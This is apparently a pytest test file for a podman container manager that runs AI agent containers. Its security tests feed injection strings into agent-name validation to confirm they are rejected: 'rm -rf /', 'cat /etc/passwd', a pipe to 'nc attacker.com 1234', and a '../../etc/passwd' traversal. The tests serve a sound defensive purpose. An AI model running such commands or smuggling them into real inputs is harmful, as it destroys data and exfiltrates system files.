"""Tests for container operations."""
import pytest
import subprocess
from unittest.mock import Mock, patch
from ai_agents.deployment.containers import ContainerManager, ContainerInfo, ContainerError


class TestContainerManager:
    """Tests for ContainerManager."""

    def test_initialization(self):
        """Should initialize with correct defaults."""
        manager = ContainerManager()
        assert manager.agents == ["claude", "grok", "gemini"]
        assert manager.pod_name == "ai-agents"
        assert manager.timeout == 30

    def test_validate_agent_valid(self):
        """Should accept valid agent names."""
        manager = ContainerManager()
        manager._validate_agent("claude")
        manager._validate_agent("grok")
        manager._validate_agent("gemini")

    def test_validate_agent_invalid(self):
        """Should reject invalid agent names (command injection protection)."""
        manager = ContainerManager()
        with pytest.raises(ValueError, match="Invalid agent name"):
            manager._validate_agent("invalid_agent")

        with pytest.raises(ValueError, match="Invalid agent name"):
            manager._validate_agent("../../etc/passwd")

    def test_run_podman_success(self):
        """Should execute podman command successfully."""
        manager = ContainerManager()

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="output", stderr="")

            result = manager._run_podman(["version"])

            assert result.returncode == 0
            args = mock_run.call_args[0][0]
            assert args[0] == "podman"
            assert args[1] == "version"

    def test_run_podman_timeout(self):
        """Should handle command timeout."""
        manager = ContainerManager()

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("podman", 30)

            with pytest.raises(ContainerError, match="timed out"):
                manager._run_podman(["version"])

    def test_run_podman_not_found(self):
        """Should handle missing podman command."""
        manager = ContainerManager()

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            with pytest.raises(ContainerError, match="Podman not found"):
                manager._run_podman(["version"])

    def test_start_container_success(self):
        """Should start container successfully."""
        manager = ContainerManager()

        with patch.object(manager, "is_container_running") as mock_running:
            mock_running.return_value = False

            with patch.object(manager, "container_exists") as mock_exists:
                mock_exists.return_value = True

                with patch.object(manager, "_run_podman") as mock_run:
                    mock_run.return_value = Mock(returncode=0)
                    assert manager.start_container("claude") is True

    def test_stop_container_success(self):
        """Should stop container successfully."""
        manager = ContainerManager()

        with patch.object(manager, "is_container_running") as mock_running:
            mock_running.return_value = True

            with patch.object(manager, "_run_podman") as mock_run:
                mock_run.return_value = Mock(returncode=0)
                assert manager.stop_container("claude") is True

    def test_exec_in_container_success(self):
        """Should execute command in container."""
        manager = ContainerManager()

        with patch.object(manager, "is_container_running") as mock_running:
            mock_running.return_value = True

            with patch.object(manager, "_run_podman") as mock_run:
                mock_run.return_value = Mock(returncode=0, stdout="output", stderr="")

                result = manager.exec_in_container("claude", ["python3", "--version"])

                assert result.returncode == 0
                assert result.stdout == "output"

    def test_exec_in_container_not_running(self):
        """Should fail if container not running."""
        manager = ContainerManager()

        with patch.object(manager, "is_container_running") as mock_running:
            mock_running.return_value = False

            with pytest.raises(ContainerError, match="not running"):
                manager.exec_in_container("claude", ["python3", "--version"])


class TestContainerSecurity:
    """Security-focused tests."""

    def test_no_command_injection(self):
        """Should prevent command injection via agent name."""
        manager = ContainerManager()

        malicious_names = [
            "claude; rm -rf /",
            "claude && cat /etc/passwd",
            "claude | nc attacker.com 1234",
        ]

        for name in malicious_names:
            with pytest.raises(ValueError):
                manager._validate_agent(name)

    def test_timeout_protection(self):
        """All operations should have timeout protection."""
        manager = ContainerManager()

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            manager._run_podman(["version"])

            call_kwargs = mock_run.call_args[1]
            assert "timeout" in call_kwargs
            assert call_kwargs["timeout"] == manager.timeout
